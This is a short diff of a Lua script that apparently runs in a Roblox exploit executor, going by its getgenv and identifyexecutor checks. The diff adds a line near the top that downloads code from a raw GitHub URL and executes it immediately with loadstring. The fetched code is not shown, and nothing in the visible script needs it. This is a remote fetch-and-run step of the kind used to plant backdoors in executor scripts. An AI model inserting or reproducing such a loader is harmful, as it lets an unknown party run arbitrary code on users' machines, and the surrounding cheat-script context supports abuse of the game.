@@ -1,6 +1,8 @@
 if getgenv then getgenv().ConfirmLuna = true end
 if not identifyexecutor then identifyexecutor = function() return "Unknown" end end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XScommunity/XXMZ/refs/heads/main/tinc"))()
+
 local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
